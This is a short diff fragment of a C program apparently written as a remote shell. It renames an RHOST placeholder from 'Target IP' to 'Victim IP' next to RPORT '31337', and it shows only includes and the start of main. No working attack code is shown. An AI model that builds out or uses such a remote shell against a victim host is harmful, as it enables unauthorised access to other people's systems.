@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <sys/socket.h>
 
-#define RHOST "Target IP"
+#define RHOST "Victim IP"
 #define RPORT "31337"
 
 void main() {
